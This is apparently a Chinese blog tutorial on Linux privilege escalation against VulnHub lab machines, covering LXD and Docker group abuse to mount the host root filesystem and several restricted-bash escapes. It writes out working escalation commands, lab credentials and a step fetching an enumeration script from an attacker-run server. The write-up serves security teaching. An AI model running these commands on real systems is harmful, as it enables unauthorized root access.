---
title: "5.Linux 提权进阶：LXD/Docker 容器提权与 Rbash 限制绕过实战"
slug: linux-privilege-escalation-lxd-docker-rbash
cover: ""
date: 2026-01-09
categories:
  - 权限提升
tags:
  - LXD提权
  - Docker逃逸
  - Rbash绕过
halo:
  site: http://www.hzhsec.top
  name: cc8c8d5b-c54f-4f51-91f9-838cff1d930c
  publish: true
---

```


---
# LXD容器

> LXD是基于LXC容器的管理程序，当前用户可操作容器，理解为用户创建一个容器，再用容器挂载宿主机磁盘，最后使用容器权限操作宿主机磁盘内容达到提权效果。

**lxd本地提权条件:**

- 已经获得Shell
- 用户属于lxd组

**复现环境**  
https://www.vulnhub.com/entry/ai-web-2,357/
## 1、入口点

通过web打点,拿到www-data的权限  

```

apache配置文件
/etc/apache2/sites-enabled/000-default.conf
```

翻找目录发现 `/var/www/html/webadmin/S0mextras` 目录下面有一个账号密码的文件 `.sshUserCred55512.txt`  
![[Pasted image 20251102150349.png]]
```
User: n0nr00tuser
Pass: zxowieoi4sdsadpEClDws1sf
```

连接 SSH
```

ssh  n0nr00tuser@192.168.88.154
zxowieoi4sdsadpEClDws1sf
```

---

## 2、检测及利用

```

./LinEnum.sh
```

![[Pasted image 20251102152240.png]]

或 `id` 判断用户组

小镜像来源  
https://github.com/saghul/lxd-alpine-builder

---

## 3、创建容器 → 挂载磁盘 → 进入宿主根目录 → 提权

创建容器镜像：

```

lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias test
```

启动特权容器：

```

lxc init test test -c security.privileged=true
```

![[Pasted image 20251102152709.png]]

挂载宿主机磁盘：

```

lxc config device add test test disk source=/ path=/mnt/root recursive=true
```

启动并进入：

```

lxc start test
lxc exec test /bin/sh
cd /mnt/root/root
cat flag.txt
```

![[Pasted image 20251102152823.png]]

---

# Docker容器

将普通用户加入 docker 组，并使用 newgrp 切换权限

创建测试用户并加入 docker 组：

```

usermod -G docker test
newgrp docker
su test
```

![[Pasted image 20251102153407.png]]

挂载宿主机根目录：

```

docker run -v /:/mnt -it alpine
```

![[Pasted image 20251102153645.png]]

删除测试用户：

```

userdel dockertest
```

---

## Docker 本地提权条件

1. 已经获得 Shell
2. 用户属于 docker 组

参考：云安全95-96课 — 容器逃逸部分

复现环境  
https://www.vulnhub.com/entry/chill-hack-1,622/

---

### 靶场速通流程

- FTP 匿名登录
- `http://192.168.88.155/secret/` → 命令执行点
- `sudo -l` 发现可切换用户 → `sudo -u apaar ./.helpline.sh`
- 发现本地 9001 端口开放
- `/var/www/files/images` 图片中隐藏 zip → 爆破密码
- 获取用户 anurodh 密码

查看可登录普通用户：
```

getent passwd {1000..60000}
```

#### 1、入口点

```

User: anurodh
Pass: !d0ntKn0wmYp@ssw0rd
```

#### 2、检测及利用

```

./LinEnum.sh
```

![[Pasted image 20251102171343.png]]

#### 3、利用 Docker 提权

```

docker run -v /:/mnt -it alpine
cd /mnt/root
```

![[Pasted image 20251102171644.png]]

---

# Rbash绕过

> Rbash(The Restricted mode of bash), 也就是限制型 bash，需进行绕过后才能开展后续利用。

参考文章：  
https://xz.aliyun.com/t/7642

---

## 实验

创建测试用户：

```

adduser test
passwd test 123456
```

修改为 rbash：

```

sudo usermod -s /bin/rbash test
```

限制效果如下：  
![[Pasted image 20251102174635.png]]

---

## 复现靶机环境

https://www.vulnhub.com/entry/funbox-rookie,520/

### 1、入口点

```

fscan -h 192.168.1.0/24
ftp 192.168.1.8
get tom.zip (密码:iubire)
ssh tom@192.168.1.8 -i id_rsa
```

### 2、Rbash 绕过

检查并传脚本：

```

python -m http.server 8080
wget [http://192.168.1.3:8080/LinEnum.sh](http://192.168.1.3:8080/LinEnum.sh)
```

执行绕过方式：

```

awk 'BEGIN {system("/bin/bash")}'
```
```

sudo mysql -utom -pxx11yy22!
! bash
```

vim / vi 启动 shell：

```

:set shell=/bin/sh
:shell
```

### 3、历史记录泄漏 → 提权

```

./LinEnum.sh
cat /home/tom/.mysql_history

su root (密码: xx11yy22!)
```